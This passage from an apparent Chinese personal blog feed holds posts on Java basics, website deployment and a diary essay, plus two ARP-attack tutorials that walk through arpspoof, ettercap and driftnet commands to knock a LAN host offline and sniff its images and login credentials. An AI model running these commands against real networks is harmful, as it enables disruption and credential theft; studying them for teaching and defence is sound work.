64<br>二进制：0000000011000000<br>十六进制：00c0</p><p>0xf4;(十六进制的书写形式)<br>二进制：1111 0100<br>十进制：128 + 64 + 32 + 16 + 4 = 244</p><h3 id="三、-Java的数据类型"><a href="#三、-Java的数据类型" class="headerlink" title="三、    Java的数据类型"></a>三、    Java的数据类型</h3><p>Java中的数据类型，分为引用类型和基本数据类型，基本类型有8种。<br>基本数据类型<br>整形：byte short int long<br>浮点型 float double<br>字符型char<br>布尔型boolean</p><h3 id="a-整数类型"><a href="#a-整数类型" class="headerlink" title="a)    整数类型"></a>a)    整数类型</h3><p>byte  8位  0x7f   0x80<br>short  16位   0x7fff  0x8000<br>int 32位    0x7fffffff 0x80000000<br>long 64  …   …</p><h3 id="b-浮点数类型"><a href="#b-浮点数类型" class="headerlink" title="b)    浮点数类型"></a>b)    浮点数类型</h3><p>float 32位 float的精度是23位(即能精确表达23位的数，超过就被截取)<br>不精确，很少被使用。<br>用小数表示的数据类型</p><p>double 类型能表示64位<br>double精确度比int精确，但是不如long<br>需要注意的是：浮点数的字面量默认就是double</p><h3 id="c-字符类型"><a href="#c-字符类型" class="headerlink" title="c)    字符类型"></a>c)    字符类型</h3><p>char 经常用到的，必须掌握，字符类型是一个16位无符号位的整数。<br>这个数是一个字符的unicode编码值。<br>Unicode编码值 是全球范围内的编码方法，编制了英文，中，日，韩，阿拉伯，希伯来等等共65535个字符.<br>Java中的char 的范围是0-65535<br>Unicode编码中英文部分与Ascii码兼容(ASCII表示0-128)<br>编码是什么？在计算机中不能写字，只能有0和1表示的数。<br>人为规定某个数除了表示一个数还可以表示一个字符。<br>一个10进制的65 代表的字符就是大写的A。</p><h3 id="d-布尔类型"><a href="#d-布尔类型" class="headerlink" title="d)    布尔类型"></a>d)    布尔类型</h3><p>布尔类型：boolean 表示真(true)假(false)</p><h3 id="四、-数据类型的转换"><a href="#四、-数据类型的转换" class="headerlink" title="四、    数据类型的转换"></a>四、    数据类型的转换</h3><p>自动类型转换<br>小类型到大类型的转换称为自动类型转换，是自动完成的。也叫隐式类型转换。<br>一般不需要处理，规则是：符号位会自动扩展，负数补1，正数不0.保证补码数值不变。</p><p>强制类型转换<br>这种转换有风险，会溢出，或者损失精度。要注意数据范围。</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 变量 进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网内的不速之客（2）</title>
      <link href="/2019/07/15/attark/arp2/"/>
      <url>/2019/07/15/attark/arp2/</url>
      
        <content type="html"><![CDATA[<p>如果arp攻击是断网，那么arp欺骗就是对数据流量的截获，其实原理很简单，就是以kali系统为目标主机向路由器说我就是你要发送信号的主机，这样kali在开启ip地址转发的情况下，上网所经的数据流量经过kali主机，kali就能对其进行图片，账号密码的截获，当然并不是能百分之百截获到，只能获取到一部分，但这样已经会造成很大的安全问题！</p><h3 id="cat-proc-sys-net-ipv4-ip-forward"><a href="#cat-proc-sys-net-ipv4-ip-forward" class="headerlink" title="cat /proc/sys/net/ipv4/ip_forward"></a>cat /proc/sys/net/ipv4/ip_forward</h3><p>   //查看kali系统是否开启了ip地址转发（其中0表示没有开起1表示开启）</p><h3 id="echo-1-gt-proc-sys-net-ipv4-ip-forward"><a href="#echo-1-gt-proc-sys-net-ipv4-ip-forward" class="headerlink" title="echo 1 &gt;/proc/sys/net/ipv4/ip_forward"></a>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</h3><p>  // 临时修改kali系统开启ip地址转发（开启IP地址转发，目标主机依然可以上网，但网络质量可能会很差）</p><h4 id="如何使kali系统永久开启ip地址转发？"><a href="#如何使kali系统永久开启ip地址转发？" class="headerlink" title="//如何使kali系统永久开启ip地址转发？"></a>//如何使kali系统永久开启ip地址转发？</h4><p>输入命令：vim /etc/sysctl.conf<br>找到对应的命令行，net ipv4.ip forward=1;将警号去掉即可永久生效，或者复制命令行在命令下，带警号这样就起到了注释的作用<br>这时候kali系统就相当于一个路由器，可以实现ip地址的转发<br>输入命令</p><h4 id="arpspoof-i-eth0-t-192-168-43-129-192-168-43-5"><a href="#arpspoof-i-eth0-t-192-168-43-129-192-168-43-5" class="headerlink" title="arpspoof -i eth0 -t 192.168.43.129 192.168.43.5"></a>arpspoof -i eth0 -t 192.168.43.129 192.168.43.5</h4><p>另外在开启一个终端窗口</p><h4 id="driftnet-i-eth0"><a href="#driftnet-i-eth0" class="headerlink" title="driftnet -i eth0"></a>driftnet -i eth0</h4><h4 id="抓到本地：driftnet-i-eth0-d-home-路径"><a href="#抓到本地：driftnet-i-eth0-d-home-路径" class="headerlink" title="抓到本地：driftnet -i eth0 -d /home/**(路径)"></a>抓到本地：driftnet -i eth0 -d /home/<em>**</em>(路径)</h4><h3 id="2-图形化工具"><a href="#2-图形化工具" class="headerlink" title="2.图形化工具"></a>2.图形化工具</h3><h4 id="ettercap-–-help-查看参数"><a href="#ettercap-–-help-查看参数" class="headerlink" title="ettercap – help 查看参数"></a>ettercap – help 查看参数</h4><h4 id="ettercap-G-进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-gt-ArP毒化"><a href="#ettercap-G-进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-gt-ArP毒化" class="headerlink" title="ettercap - G //进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-&gt;ArP毒化"></a>ettercap - G //进入图形化管理界面，扫描端口下存活主机，将网关IP地址加到atark1目标主机添加到atark2选择Mitm-&gt;ArP毒化</h4><h4 id="ettercap-i-eth0-Tq-M-arp-remote-192-168-43-129-192-168-43-144"><a href="#ettercap-i-eth0-Tq-M-arp-remote-192-168-43-129-192-168-43-144" class="headerlink" title="ettercap -i eth0 -Tq -M arp:remote //192.168.43.129// //192.168.43.144//"></a>ettercap -i eth0 -Tq -M arp:remote //192.168.43.129// //192.168.43.144//</h4><p>其中 tq是静态文本，M为中间人攻击，格式严谨<br>开启攻击—底部出现help，那么一般情况下就是启动成功了<br>这时候再使用driftnet -i eth0<br>对图片进行截获，不知道为啥但是感觉图形化工具比较好用，截获图片数量也比较多</p><h3 id="3-获取用户登陆密码及账号"><a href="#3-获取用户登陆密码及账号" class="headerlink" title="3.获取用户登陆密码及账号"></a>3.获取用户登陆密码及账号</h3><p>我做了靶机测试，发现并不是所有账号密码都可以截获现在很多网站采用https传输协议，即使截到了也不一定是明文，通常是通过某些特殊算法进行加密<br>so，懂我意思吧！</p><h3 id="步骤，开启两个终端，输入命令"><a href="#步骤，开启两个终端，输入命令" class="headerlink" title="步骤，开启两个终端，输入命令"></a>步骤，开启两个终端，输入命令</h3><h4 id="1-echo-1-gt-proc-sys-net-ipv4-ip-forward（终端1）"><a href="#1-echo-1-gt-proc-sys-net-ipv4-ip-forward（终端1）" class="headerlink" title="1.echo 1 &gt;/proc/sys/net/ipv4/ip_forward（终端1）"></a>1.echo 1 &gt;/proc/sys/net/ipv4/ip_forward（终端1）</h4><h4 id="2-arpspoof-i-eth0-t-192-168-43-129-192-168-43-5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）"><a href="#2-arpspoof-i-eth0-t-192-168-43-129-192-168-43-5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）" class="headerlink" title="2.arpspoof -i eth0 -t 192.168.43.129 192.168.43.5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）"></a>2.arpspoof -i eth0 -t 192.168.43.129 192.168.43.5（终端1，前一个ip地址是目标ip，后一个主机地址是网关，这个语法通俗点讲就是告诉路由器我是你要发送信息的目标）</h4><h4 id="3-ettercap-Tq-i-eth0（终端2，开启静态文本监听模式）"><a href="#3-ettercap-Tq-i-eth0（终端2，开启静态文本监听模式）" class="headerlink" title="3.ettercap -Tq -i eth0（终端2，开启静态文本监听模式）"></a>3.ettercap -Tq -i eth0（终端2，开启静态文本监听模式）</h4><p>基本上输入号这三个命令就完成了对目标主机账号密码的监听，随着时代进步，手工输入密码的形式渐渐被扫描二维码登陆所代替。</p>]]></content>
      
      
      <categories>
          
          <category> Arp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转发 </tag>
            
            <tag> 截获 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java环境变量</title>
      <link href="/2019/07/11/java/java/"/>
      <url>/2019/07/11/java/java/</url>
      
        <content type="html"><![CDATA[<h2 id="如何配置Java环境变量"><a href="#如何配置Java环境变量" class="headerlink" title="如何配置Java环境变量"></a>如何配置Java环境变量</h2><h3 id="1-下载1-8版本的JDK-傻瓜式安装，（一路默认选择）"><a href="#1-下载1-8版本的JDK-傻瓜式安装，（一路默认选择）" class="headerlink" title="1.    下载1.8版本的JDK -傻瓜式安装，（一路默认选择）"></a>1.    下载1.8版本的JDK -傻瓜式安装，（一路默认选择）</h3><h3 id="2-Java环境变量配置："><a href="#2-Java环境变量配置：" class="headerlink" title="2.    Java环境变量配置："></a>2.    Java环境变量配置：</h3><p>a)    JAVA_HOME</p><h5 id="i-首先右击-计算机-进入-属性-然后选择其中的-高级系统设置"><a href="#i-首先右击-计算机-进入-属性-然后选择其中的-高级系统设置" class="headerlink" title="i.    首先右击[计算机]进入[属性]然后选择其中的[高级系统设置]"></a>i.    首先右击[计算机]进入[属性]然后选择其中的[高级系统设置]</h5><p>点击进入[高级]中的[环境变量]，进入环境变量编辑界面。<br>变量名：JAVA_HOME<br>变量值：实际的安装路径（jdk所在的路径，通常默认在c盘programfile—&gt;java文件内）</p><h5 id="b-Path变量的设置"><a href="#b-Path变量的设置" class="headerlink" title="b)    Path变量的设置"></a>b)    Path变量的设置</h5><p>i.    同样是在[系统变量中]，我们可以看到path变量已经存在，那么我们只需要点击编辑即可。  </p><h5 id="变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin"><a href="#变量值：-JAVA-HOME-bin-JAVA-HOME-jre-bin" class="headerlink" title="变量值：%JAVA_HOME%\bin; %JAVA_HOME%\jre\bin;"></a>变量值：%JAVA_HOME%\bin; %JAVA_HOME%\jre\bin;</h5><h5 id="bug："><a href="#bug：" class="headerlink" title="bug："></a>bug：</h5><p>我在配置path环境变量的时候发生了一个小问题，按%Java_HOME%,这个是相对路径，但是在dos界面Javac却找不到命令，于是我将path变量新增了jre和jdk/bin目录（绝对路径）后这个问题得到了解决</p><h4 id="c-Classpath"><a href="#c-Classpath" class="headerlink" title="c)    Classpath:"></a>c)    Classpath:</h4><h5 id="变量值：-java-home-lib-java-home-lib-tools-jar"><a href="#变量值：-java-home-lib-java-home-lib-tools-jar" class="headerlink" title="变量值：.;%java_home%\lib;%java_home%\lib\tools.jar;"></a>变量值：.;%java_home%\lib;%java_home%\lib\tools.jar;</h5><h3 id="二、-Java环境变量配置详解"><a href="#二、-Java环境变量配置详解" class="headerlink" title="二、    Java环境变量配置详解"></a>二、    Java环境变量配置详解</h3><h4 id="1-JAVA-HOME"><a href="#1-JAVA-HOME" class="headerlink" title="1.    JAVA_HOME"></a>1.    JAVA_HOME</h4><p>为了方便引用，例如你jdk安装在C：/xxx/xx/xx目录里，则设置JAVA_HOME为该目录的引用。那么以后你要使用这个路径的时候，只需要输入%JAVA_HOME%即可。</p><h4 id="2-path"><a href="#2-path" class="headerlink" title="2.    path"></a>2.    path</h4><p>你想在任何时候都使用%JAVA_HOME%\bin\java命令来执行可行性文件吗？显然不会。于是你可以选择把%JAVA_HOME%\bin\java添加到PATH路径下。这样我们就可以在任何路径下只用java执行命令.</p><h4 id="3-classpath"><a href="#3-classpath" class="headerlink" title="3.    classpath"></a>3.    classpath</h4><p>为了程序能够找到相应的.class文件。举个例子：编译一个JAVA程序A.java<br>会得到一个A.class的类文件。在当前目录下执行java A 将会得到相应的结果<br>(前提是已经设置CLASSPATH为”.”)现在，把A.class移到别的目录下，在执行<br>Java A 将会抛出java.lang.NoClassDelFoundError异常。因为找不到.class文件。<br>现在你把CLASSPATH增加为你转移的目录在运行，结果才会正常。<br>总之一句话去高阔classpath：加载被编译过的.java文件，使之可以找到对应的.class文件。  </p><h5 id="总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件"><a href="#总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件" class="headerlink" title="总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件"></a>总结：一共需要配置三个环境变量，每个环境变量所对应的执行条件不同，环境变量的配置意味着操作系统能否找到并成功执行java文件</h5><h5 id="知识拓展"><a href="#知识拓展" class="headerlink" title="知识拓展"></a>知识拓展</h5><p>JDK :就是Java开发工具包<br>JRE：就是Java运行时环境<br>JVM：Java虚拟机<br>Java Se API：就是Java系统核心类库<br>JDK包含了JRE</p><p>JavaSe:基础<br>JavaEE：web企业级应用开发<br>JavaMe：Android</p><h4 id="问题：-jar包是什么？封装好的jar包是否能得到源码？"><a href="#问题：-jar包是什么？封装好的jar包是否能得到源码？" class="headerlink" title="问题： jar包是什么？封装好的jar包是否能得到源码？"></a>问题： jar包是什么？封装好的jar包是否能得到源码？</h4><h4 id="答：jar包实际上是一个压缩文件，类似-rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。"><a href="#答：jar包实际上是一个压缩文件，类似-rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。" class="headerlink" title="答：jar包实际上是一个压缩文件，类似.rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。"></a>答：jar包实际上是一个压缩文件，类似.rar，jar包通常叫第三方库，框架，其实就是别人写好的工具类，通过反编译就能得到源码。</h4>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲散</title>
      <link href="/2019/07/08/composition/"/>
      <url>/2019/07/08/composition/</url>
      
        <content type="html"><![CDATA[<p>我也是无语啦，写了三千字，没保存，so 使用markdown一定要选启用自动保存啊！！！<br>没啥好命名的题目，随便开始写吧！<br>在我过去一年的大学生涯里，我深刻的体会到了当代大学生的迷惘和困惑。一进学校就开始焦虑自己的未来，非常功利的规划自己每一步，我要怎么怎么样，但现实是残酷的，其实我高中时并不是这样的人，那时我行我素，固步自封，用俗话讲就是头铁吧！下面讲个故事吧，所谓事情的发展总是两面性的，物极必反，在那样“头铁”的性子下，我离家出走了，我一直认为一个人也可以生活的很好，然而…还是那句话，现实是残酷的，很快我身上带的钱所剩无几，这意味着我不赚钱将会面临挨饿，那是我第一次感受到危机感，迫于生活，我找到了一家中介公司，中介以强硬的态度让我签下很多份含有不平等条约的合同，当时，我还有些高兴，我找到工作了，但这只是故事的开始。<br>我如期的进到了一家洗衣液外包工厂，老油条们都喜欢欺负新人，什么重活脏活都给我，车间头儿也是有点小权时时刻刻发挥到极致，我任劳任怨的虚度着光阴，我其实是一个利他主义者，或许这种行为的本质就是内心善良吧，然而这种善良并不会被人们珍惜，反而会被肆意践踏。直到有一天我被调到厂里流水线作业量最大的生产线上，我因为跟不上巨大的工作量，boss直接要开除我，并扬言不会给一分钱工钱。<br>从小就听老师讲，有问题找警察，嗯，于是我就报警啦，然而警察告诉我，这方面事情，他们管不了，这种事要去劳动局，申诉，劳动仲裁，法院起诉，一系列流程，我深刻的意识到这个时间我是耗不起的，当时啊真的是穷困潦倒，风餐露宿。不知道你们报没报过警，他们如果出动了警力，需要对报警人信息做一个备案，就这样我还被带去派出所一趟。没办法我还是去了劳动局，我等了很久排上号，那个服务区的人就给我一种有理也没地方说的感觉吧！最后那人讲了一句，小兄弟回家吧！别出来打工了，他就喊了下一号，顿时什么贪污受贿，狼狈为奸，官官相护出现在我的脑海，我不甘，在那等了一夜，第二天他一上班我又来了，我如愿的要到了一张申诉表，最后经过“他们”之间的协商，给了我三百块钱，我记得当时干了十天，一天十二小时吧，十天我就被开除了，因为啥啊，就因为我是临时的呗，这是资本主义管用的手法，杀一儆百。嗯，当时就一个想法，以后不想再那么累，我又想到父亲说的一些话，韵味深长。所以呢我写这个故事希望能前车之鉴，让你有些感悟少走些弯路。  </p><p>#####努力不一定成功，也不一定就有什么结果，但你努力过就会有收获（经历）。  </p><p>身边的很多人，焦虑为什么别人目标那么明确，自己却没有那么清晰。出于某种补偿心理，他们会一方面参加各种各样的社团活动，社会实践，另一-方面门门考试逼着自己拿A。其实在这种全方面恶性竞争的生态下，只会造就两种人，全面彻底的输家，和全面彻底的但是却是insecured overacheivers的赢家。都说大学教育正在堕落成为失去灵魂的卓越，当然这不是大学问题，而是后现代性的社会出现的必然问题，在此不表，有空另开小灶。但是在我看来，更可忧虑的是那些赢家并不因此成就”卓越”，反倒可能因为熟谙了各种潜规则而变成蝇营狗苟的现实主义者，与此相对，输家则因为遭遇挫或不公而成为愤世嫉俗者和犬儒主义者。无论是哪一种结果，都以丧失灵魂为代价。所以这就是为什么部分大学生涯里我在我的四周自己给自己修起了一座高墙，自己不想出去，也不准别人走进的原因:当谈论的只是各种八卦新闻、网络游戏或说纯粹的男欢女爱，这样的大学一定不可能是卓越的，因为它背离了大学的本义。<br>或许长此以往，我也会变成那种我曾经讨厌的人，此时我想起一首歌<br>有人浪迹江湖，有人寒窗苦读</p><p>有人阿谀奉承，有人早已麻木</p><p>有人嫌贫爱富，有人唯利是图</p><p>有人精打细算，有人满不在乎  </p><p>为此我经常体会到了自己的矛盾，我，你，都是社会性体会。要在社会里走下去，必须要玩社会本身的游戏规则，尤其潜规则玩好比实打实的规则更重要。至于如何调整、引导这个矛盾，是我一直在学习的一件事情。我目前的方法是:是专注。走不出去，，那就专注的做好每件事情吧，那就把它做到极致吧。每个人都在寻找那个可以用尽全身气力去拥抱的对象，并且希望这个拥抱可以让自己变得安全、强大甚至完满。但随着年复一年的变更，我越来越认同昂山素季的这个说法“真正的改变是通过理解、同情、正义、爱心后的内在变化。”只有经历了如此这般的内在变化，你才会和自己停战，才能够学会不自负、不迟疑、也不骄慢”地与世界媾和。小至个体，大到国家，概莫能外。  </p><p>我总是亦步亦趋，因为我害怕失败，其实不过是自尊心作祟，我已经是个彻彻底底的loser，我还有什么释怀不了呢，其实最大的敌人莫过于自己，加油！</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经历 </tag>
            
            <tag> 感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站开发概述（2）</title>
      <link href="/2019/06/27/web/web2/"/>
      <url>/2019/06/27/web/web2/</url>
      
        <content type="html"><![CDATA[<h3 id="材料准备："><a href="#材料准备：" class="headerlink" title="材料准备："></a>材料准备：</h3><p>1.云服务器–以我的服务器为例子<br><img src="http://img.ahdy.top/2019-06-27_172422.png" alt><br>2.tomcat服务器（这时候可能有些人会懵，这两个服务器有啥区别，云服务器呢就是放tomcat的服务器，而tomcat服务器是存放你项目的服务器，它们是一种从属，包含关系）这里附上tomcat的下载连接(自带jdk-我都叫它解压版的tomcat)<br><a href="https://share.weiyun.com/57Wjpp2" target="_blank" rel="noopener">tomcat</a><br>3.你的项目</p><h3 id="远程连接："><a href="#远程连接：" class="headerlink" title="远程连接："></a>远程连接：</h3><p>第一步，首先要对你的云服务器进行环境部署，那么这极为重要的一步就是要通过远程桌面连接上服务器<br>1.右键点击开始点击运行（快捷键win+R）在命令行内输入mstsc<br><img src="http://img.ahdy.top/2019-06-27_172423.png" alt><br>2.输入本机计算机用户名（administrator），和需要连接的服务器公网ip地址<br><img src="http://img.ahdy.top/2019-06-27_172424.png" alt><br>3.输入服务器的密码<br><img src="http://img.ahdy.top/2019-06-27_172425.png" alt><br>4.连接成功<br><img src="http://img.ahdy.top/2019-06-27_214328.png" alt></p><h3 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h3><p>将下载好的 websever（tomcat）打包复制粘贴到服务器上<br>解压后把项目放到下图路径内<br><img src="http://img.ahdy.top/2019-06-27_214613.png" alt><br><img src="http://img.ahdy.top/2019-06-27_214831.png" alt><br>启动tomcat服务器<br><img src="http://img.ahdy.top/2019-06-27_215101.png" alt><br>出现如上图字样服务器运行成功，此时dos界面不可以关闭，在浏览器内输入公网的IP地址就你能访问的网站<br>以我的项目演示<br><img src="http://img.ahdy.top/2019-06-27_215356.png" alt><br>此时静态网站发布完成！</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>一、本机测试<br>在HBuilder里测试<br>在WebServer里测试<br>二、部署到公网服务器<br>申请一台公网服务器 ( 阿里云/腾讯云/百度云)<br>远程登录上去，把WebServer.zip拷上去<br>把网站项目文件拷贝到 webapps\ROOT\下<br>启动服务</p><h5 id="后续loading"><a href="#后续loading" class="headerlink" title="后续loading"></a>后续loading</h5><p>动态网站开发概述与项目发布</p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态网站 </tag>
            
            <tag> 发布 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站开发概述（1）</title>
      <link href="/2019/06/26/web/web1/"/>
      <url>/2019/06/26/web/web1/</url>
      
        <content type="html"><![CDATA[<h5 id="你是否也想拥有一个自己的网站呢？"><a href="#你是否也想拥有一个自己的网站呢？" class="headerlink" title="你是否也想拥有一个自己的网站呢？"></a>你是否也想拥有一个自己的网站呢？</h5><p>接下来的网站系列我会概述，制作一个静态网站所需要的东西，以及将制作好的项目发布到服务器上的教程。</p><p>####### 网站类型：网站呢！它分为静态网站和动态网站，所谓静态网站就是没有后台的，作为静态展示用的网站<br>动态的，大家一般就理解成有后台支持的，可以通过后台修改网页内容的网站那种（这里的后台指后台管理操作，有数据库支持，能对网站做出更新的功能）</p><h5 id="1-开发软件的安装-HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）"><a href="#1-开发软件的安装-HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）" class="headerlink" title="1.开发软件的安装 HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）"></a>1.开发软件的安装 HBuilder（这款编译器有很强的代码索引功能，写起代码非常轻松）</h5><p>这里附上HBuilder的安装包地址—<a href="https://share.weiyun.com/5AOIOrI" target="_blank" rel="noopener">腾讯微云</a>—<br>安装好了之后你就可以开始开发一个静态网站了！一个静态网站基本需要会html的标签语法加上css布局和一定的js水平<br>如果是小白的话不用担心，可以自学，这里跟一些比较好的自学网站地址<br><a href="https://www.runoob.com/" target="_blank" rel="noopener">菜鸟教程</a>  <a href="http://www.w3school.com.cn/" target="_blank" rel="noopener">W3school</a></p><h5 id="2-网站发布概述"><a href="#2-网站发布概述" class="headerlink" title="2.网站发布概述"></a>2.网站发布概述</h5><p>发布网站，想让全国各地的人访问到你的网站，就要把你制作好的网站发布到服务器上（服务器呢它虽然叫服务器，其实它就是一台不关机的电脑，不知道你是否了解远程连接，远程访问，可以这么理解服务器它就是任何用户都可以访问的一台电脑）<br>嗯！可能解释的有些抽象，但当你有了一台自己的服务器的时候，你会发现我说的非常通俗易懂！哈哈<br>这时候你会产生疑问，我的项目该放在服务器的哪个地方呢！这里就需要说到应用层服务器，阿帕奇的tomcat，这个东西它能自动解析你的项目，一主默认的主网页都是index.html，它解析过了之后呢，你运行它通常就是出来一个dos界面里面显示几月几月份<br>然后你通过你服务器公网的ip地址就能直接访问到你的网站了！</p><h5 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h5><p>当你手中有一个比较完善的项目的时候，这时候就需要将web项目进行部署<br>1.你需要一台服务器来运行你的项目，服务器哪里买呢，中国四大服务器运营商，什么阿里，腾讯，华为，百度，我是买的阿里的，阿里有个云翼计划（活动），对学生优惠9.5一个月服务器，很便宜，可以玩很久.<br>2.你需要一个域名来解析你的服务器公网ip地址，（这时候可能有人会疑问，什么是域名呢，域名它实际上是一个网址，一般都是万维网www开头的，通过这个域名就能访问你的网站内容，嗯，是不是很容易理解呢）<br>3.你需要将tomecat或其他..安装到服务器上，并配置jdk环境</p><h4 id="4-内网穿透（把自己电脑当成服务器）"><a href="#4-内网穿透（把自己电脑当成服务器）" class="headerlink" title="4.内网穿透（把自己电脑当成服务器）"></a>4.内网穿透（把自己电脑当成服务器）</h4><p>比如有些人不想买服务器，或者我没有钱买怎么办呢，在网站教程系列的末尾，<br>会出一篇关于使用《花生壳内网穿透的教程》，这个原理很容易明白就是把你的电脑ip地址映射到公网上，这样别人就能通过浏览器来访问你的网站，嗯，但是也有弊端，自己的电脑需要一直开着，并且会使它不安全，或者出现上行不够的情况</p>]]></content>
      
      
      <categories>
          
          <category> 网站 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网内的不速之客（1）</title>
      <link href="/2019/06/13/attark/arp1/"/>
      <url>/2019/06/13/attark/arp1/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ahdy.top/2019-06-13_175422.png" alt="@子龙"><br>当你在虚拟机中安装好了kali系统的时候（如上图所示），kali系统包含众多脚本，可以帮助我们做很多测试，下面主要介绍Arp攻击的原理及教程</p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><h3 id="ARP攻击的局限性"><a href="#ARP攻击的局限性" class="headerlink" title="ARP攻击的局限性"></a>ARP攻击的局限性</h3><p>ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行。</p><p>无法对外网（互联网、非本区域内的局域网）进行攻击。</p><h3 id="ARP攻击的攻击原理"><a href="#ARP攻击的攻击原理" class="headerlink" title="ARP攻击的攻击原理"></a>ARP攻击的攻击原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><h2 id="在Kali-Linux环境下的实现ARP攻击"><a href="#在Kali-Linux环境下的实现ARP攻击" class="headerlink" title="在Kali Linux环境下的实现ARP攻击"></a>在Kali Linux环境下的实现ARP攻击</h2><p>攻击环境<br>攻击主机：Kali Linux </p><p>IP：192.168.1.13</p><p>被攻击主机：Windows 10</p><p>IP：192.168.1.10</p><p>因为是在虚拟机环境下实现的攻击，所以要提前将虚拟机的网络适配器设置为桥接模式，这样一来虚拟机便可以单独获得一个ip地址，而不是和NAT模式下一样和宿主机共用一个ip地址。</p><h3 id="ARP断网攻击（更多攻击手段持续更新ing）"><a href="#ARP断网攻击（更多攻击手段持续更新ing）" class="headerlink" title="ARP断网攻击（更多攻击手段持续更新ing）"></a>ARP断网攻击（更多攻击手段持续更新ing）</h3><p>在进行攻击的时候我们需要先知道自己的IP地址，在终端中输入ifconfig指令即可（所说的终端是kali系统中的cmd在左侧任务栏内，一般是第二个）</p><p><img src="http://img.ahdy.top/2019-06-13_181357.png" alt></p><p>在知道了自己IP地址的情况下，我们同时也知道了自己所在的网段，接下来我们可以找一下当前局域网下还存在哪些主机，<br>如果想看自己电脑连接的那台路由器上的网管输入ipconfig查看<br><img src="http://img.ahdy.top/2019-06-13_183724.png" alt><br>这里使用nmap脚本（nmap可以扫描出当前路由器下被占用的端口，通俗点讲就是这些端口都是有人在使用的！）出于道德我演示攻击自己的电脑为例子！<br>命令：namp -sP 192.168.1.*<br>后面的是网关ip，不是绝对的，网关地址在上图中可以看到<br><img src="http://img.ahdy.top/2019-06-13_183837.png" alt><br><img src="http://img.ahdy.top/2019-06-13_183911.png" alt><br>可以看到我们已经通过namp命令扫描出了当前路由器下的ip<br>对比上下图，我们可以发现我们的目标ip的确也是在列表中的，这个时候目标还是可以正常上网的</p><p>此时，在Kali中使用arpspoof工具实现ARP攻击<br>攻击命令：Arpspoof -i eth0 -t 192.168.1.10 -t 192.168.1.1<br>ip就是目标ip加上网关地址<br><img src="http://img.ahdy.top/2019-06-13_185319.png" alt><br><img src="http://img.ahdy.top/2019-06-13_185346.png" alt></p><p>这个时候的目标已经无法正常上网了</p><p><img src="http://img.ahdy.top/2019-06-13_185512.png" alt></p><p>停止ARP攻击，目标就能恢复到正常上网状态<br>快捷键是（Ctrl+c）结束攻击！</p>]]></content>
      
      
      <categories>
          
          <category> Arp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击 </tag>
            
            <tag> 断网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>踏上渗透之路</title>
      <link href="/2019/06/11/attark/frist/"/>
      <url>/2019/06/11/attark/frist/</url>
      
